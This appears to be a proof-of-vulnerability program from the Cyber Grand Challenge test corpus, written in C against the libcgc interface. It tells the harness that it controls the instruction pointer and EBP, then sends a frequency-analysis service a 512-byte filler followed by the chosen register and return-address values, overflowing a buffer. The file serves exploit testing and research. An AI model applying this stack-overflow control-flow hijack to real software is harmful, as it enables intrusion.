#include <libcgc.h>


int senddata(int fd, void *outdata, const size_t size) {
    size_t tx_bytes = 0;
    size_t count = 0;

    if ( outdata == NULL) {
        return -1;
    } 

    while (count < size) {
        if ( transmit(fd, outdata + count, size - count, &tx_bytes) != 0 ) {
            _terminate(0);
        }

        if (tx_bytes <= 0) {
            _terminate(0);
        }

        count += tx_bytes;
    }

    return 0;
}

int recvdata(int fd, void *indata, const size_t size ) {
    size_t rx_bytes = 0;
    size_t total = 0;

    if (indata == NULL ) {
        return -1;
    } 

    while (rx_bytes < size) {
        if ( receive(fd, indata + total, size-total, &rx_bytes) != 0 ) {
            _terminate(0);
        }

        total += rx_bytes;
    }

    return 0;
}


int main(void)
{
	/// Type 1 POV Is control of PC and a reg
	int pov_type = 1;

	// I have full control of the register and pc
	int ip_mask = 0xffffffff;
	int regmask = 0xffffffff;

	/// I can control EBP
	int regnum = 5;
	unsigned int ipvalue;
	unsigned int regvalue;

	unsigned char out[512];
	int value;


	if (senddata(3, &pov_type, sizeof(pov_type)) != 0) {
		_terminate(-1);
	}

	if (senddata(3, &ip_mask, sizeof(ip_mask)) != 0) {
		_terminate(-1);
	}

	if (senddata(3, &regmask, sizeof(regmask)) != 0) {
		_terminate(-1);
	}

	if (senddata(3, &regnum, sizeof(regnum)) != 0) {
		_terminate(-1);
	}

	if (recvdata(3, &ipvalue, sizeof(ipvalue)) != 0) {
		_terminate(-1);
	}

	if (recvdata(3, &regvalue, sizeof(regnum)) != 0) {
		_terminate(-1);
	}
	
	/// Read the prompt
	recvdata(0, out, 18);

	value = 524;

	senddata(1, &value, sizeof(value));
	senddata(1, "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", 512);
	value = 512;
	senddata(1, &value, sizeof(value));
	senddata(1, &regvalue, sizeof(value));
	senddata(1, &ipvalue, sizeof(value));

	/// Read the freq anal prompt
	recvdata( 0, out, 20);

	/// Read the freq anal results
	recvdata( 0, out, 256);


	return 0;
}

